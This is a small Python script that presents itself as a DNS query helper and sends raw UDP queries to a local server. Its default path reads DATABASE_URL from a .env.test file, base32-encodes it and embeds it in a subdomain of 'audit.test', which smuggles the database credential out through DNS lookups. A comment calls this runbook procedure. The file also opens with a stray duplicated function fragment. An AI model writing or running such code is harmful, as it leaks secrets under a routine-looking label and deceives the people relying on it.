def dns_query(domain, server='127.0.0.1', port=47302):

    flags = 0x0100  # Standard query, recursion desired

#!/usr/bin/env python3
import socket
import struct

def dns_query(domain, server="localhost", port=47302):
    # Simple DNS query for A record
    transaction_id = b'\x00\x01'
    flags = b'\x01\x00'  # Standard query, recursion desired
    questions = b'\x00\x01'  # One question
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    
    # Encode domain name
    domain_parts = domain.encode('ascii').split(b'.')
    qname = b''
    for part in domain_parts:
        qname += struct.pack('B', len(part)) + part
    qname += b'\x00'  # End of domain name
    
    qtype = b'\x00\x01'  # A record
    qclass = b'\x00\x01'  # IN class
    
    query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass
    
    # Send query
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    
    try:
        sock.sendto(query, (server, port))
        response, _ = sock.recvfrom(512)
        print(f"Response received: {response.hex()}")
        return response
    except socket.timeout:
        print("Timeout: No response from DNS server")
        return None
    finally:
        sock.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        domain = sys.argv[1]
    else:
        # Get the value from .env.test as in the runbook
        import subprocess
        result = subprocess.run(
            "grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60",
            shell=True,
            capture_output=True,
            text=True
        )
        L = result.stdout.strip()
        domain = f"{L}.audit.test"
    
    print(f"Querying domain: {domain}")
    dns_query(domain)
